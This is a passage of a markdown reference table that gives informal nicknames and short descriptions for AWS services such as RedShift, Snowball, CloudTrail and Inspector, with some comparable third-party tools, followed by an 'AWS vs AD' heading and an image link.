| RedShift | Amazon Data Warehouse | Store a whole bunch of analytics data, do some processing, and dump it out. |  |
| Machine Learning | Skynet | Predict future behavior from existing data for problems like fraud detection or "people that bought x also bought y." |  |
| SWF | Amazon EC2 Queue | Build a service of "deciders" and "workers" on top of EC2 to accomplish a set task. Unlike SQS - logic is set up inside the service to determine how and what should happen. | IronWorker |
| Snowball | AWS Big Old Portable Storage | Get a bunch of hard drives you can attach to your network to make getting large amounts \(Terabytes of Data\) into and out of AWS. | Shipping a Network Attached Storage device to AWS |
| CloudFormation | Amazon Services Setup | Set up a bunch of connected AWS services in one go. |  |
| CloudTrail | Amazon Logging | Log who is doing what in your AWS stack \(API calls\). |  |
| CloudWatch | Amazon Status Pager | Get alerts about AWS services messing up or disconnecting. | PagerDuty, Statuspage |
| Config | Amazon Configuration Management | Keep from going insane if you have a large AWS setup and changes are happening that you want to track. |  |
| OpsWorks | Amazon Chef | Handle running your application with things like auto-scaling. |  |
| Trusted Advisor | Amazon Pennypincher | Find out where you're paying too much in your AWS setup \(unused EC2 instances, etc.\). |  |
| Inspector | Amazon Auditor | Scans your AWS setup to determine if you've setup it up in an insecure way | Alert Logic |

## AWS vs AD

![](../../.gitbook/assets/image%20%2825%29.png)

